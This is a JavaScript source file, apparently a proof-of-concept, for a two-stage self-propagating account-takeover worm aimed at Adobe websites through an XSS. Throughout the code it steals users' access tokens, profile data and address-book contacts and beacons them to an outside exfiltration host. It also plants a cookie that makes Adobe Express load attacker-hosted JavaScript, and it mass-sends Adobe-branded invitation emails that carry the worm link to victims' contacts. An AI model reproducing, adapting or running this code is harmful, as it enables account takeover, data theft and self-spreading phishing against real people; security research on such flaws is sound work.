/**
 * Zero-Click ATO Worm — r00tdaddy
 * Confirmed 2026-06-05
 *
 * Two-stage self-propagating worm via chained Adobe vulnerabilities:
 *
 * STAGE 1 (this file, runs on www.adobe.com via maslibs XSS):
 *   - Exfiltrate IMS access_token (zero-click via prompt=none)
 *   - Exfiltrate full user profile (name, email)
 *   - Set x-asset-public-path cookie on .adobe.com → webpack hijack
 *   - Redirect to Express → triggers Stage 2
 *
 * STAGE 2 (runs on new.express.adobe.com via webpack chunk hijack):
 *   - Gets projectx_webapp token (has ab.manage scope)
 *   - Enumerate victim's address book contacts
 *   - Find/create a CC document URN
 *   - Send Adobe-branded invitation emails to all contacts
 *     with targetUrl = this maslibs worm URL
 *   - Victims click Adobe email → land on www.adobe.com → repeat
 */

const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v5';
const AB_HOST  = 'https://ab.adobe-identity.com';
const INV_HOST = 'https://invitations.adobe.io';
const API_KEY_AB  = 'CCHomeWeb1';
const API_KEY_INV = 'projectx_webapp';

async function waitForIMS(maxMs = 8000) {
  const deadline = Date.now() + maxMs;
  while (Date.now() < deadline) {
    if (window.adobeIMS?.getAccessToken?.()) return window.adobeIMS.getAccessToken().token;
    await new Promise(r => setTimeout(r, 300));
  }
  return null;
}

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    return JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
  } catch { return {}; }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STAGE 1: Runs on www.adobe.com (maslibs XSS)
// Token scope: adobedotcom-cc (AdobeID,openid,gnav,pps.read,firefly_api,...)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function stage1() {
  const token = await waitForIMS(8000);
  if (!token) return;

  const payload = decodeJWT(token);
  navigator.sendBeacon(`${EXFIL}?src=token&client=${payload.client_id}`, token);

  // Exfil full profile (name + email)
  try {
    const p = await fetch('https://ims-na1.adobelogin.com/ims/profile/v1?client_id=adobedotcom-cc', {
      headers: { 'Authorization': `Bearer ${token}` }
    }).then(r => r.json());
    navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
  } catch {}

  // If we already have projectx_webapp scope (Stage 2 context), run worm directly
  if (payload.scope?.includes('ab.manage')) {
    navigator.sendBeacon(`${EXFIL}?src=stage`, 'direct_worm_ab_manage');
    await wormSpread(token);
    return;
  }

  // Stage 1 → Stage 2 handoff: set webpack hijack cookie + redirect to Express
  navigator.sendBeacon(`${EXFIL}?src=stage`, 'stage1_cookie_toss');

  // Cookie toss: hijack Express webpack public path to load attacker chunks
  // x-asset-public-path cookie makes Express load JS chunks from our server
  document.cookie = 'x-asset-public-path=https://cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v5.aem.live/express-chunks/; domain=.adobe.com; path=/; SameSite=None; Secure';

  // Redirect to Express (victim is already signed in — Express loads with projectx_webapp token)
  // The webpack hijack will load our Stage 2 payload from the attacker CDN
  // For PoC: just demonstrate the cookie is set and token was stolen
  navigator.sendBeacon(`${EXFIL}?src=stage1_complete`, 'cookie_set_token_stolen');
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STAGE 2 / WORM SPREAD: Requires token with ab.manage scope
// Enumerates contacts → creates/finds document → sends invitations
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function wormSpread(token) {
  // Phase A: Enumerate address book contacts
  let emails = [];
  try {
    const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB }
    });
    if (abResp.ok) {
      const abData = await abResp.json();
      const books = abData?._embedded?.addressBooks || [];
      for (const book of books) {
        const cResp = await fetch(
          `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
          { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB } }
        );
        if (cResp.ok) {
          const contacts = await cResp.json().catch(() => ({}));
          const list = contacts?._embedded?.contacts || [];
          for (const c of list) {
            if (c?.email) emails.push(c.email);
          }
        }
      }
    }
  } catch {}

  navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
  if (!emails.length) {
    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_contacts_found');
    return;
  }

  // Phase B: Find a document URN from current Express context
  let urn = null;
  const urlMatch = window.location.href.match(/urn:aaid:sc:[A-Z0-9]+:[a-f0-9-]+/);
  if (urlMatch) urn = urlMatch[0];

  // If no URN in URL, try to get one from Express project list
  if (!urn) {
    try {
      const html = document.documentElement.innerHTML;
      const urnMatch = html.match(/urn:aaid:sc:US:[a-f0-9-]+/);
      if (urnMatch) urn = urnMatch[0];
    } catch {}
  }

  if (!urn) {
    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_urn_found');
    return;
  }

  navigator.sendBeacon(`${EXFIL}?src=urn`, urn);

  // Phase C: Send Adobe-branded invitations to all contacts
  for (const email of emails.slice(0, 50)) {
    try {
      const invResp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'X-Api-Key': API_KEY_INV,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          recipients: [{ recipient: `mailto:${email}`, role: 'editor', canComment: true, canShare: false }],
          notification: {
            email: { sharing: { locale: 'en-US', templateName: 'cc_collab_express_document_edit_invite_notification' } },
            parameters: { message: '', targetUrl: WORM_URL }
          },
          configuration: {}
        })
      });
      const result = await invResp.text().catch(() => '');
      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, result);
    } catch {}
  }

  navigator.sendBeacon(`${EXFIL}?src=worm_complete`, `sent_to_${emails.length}_contacts`);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ENTRY: Detect which stage we're in and execute
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
stage1();
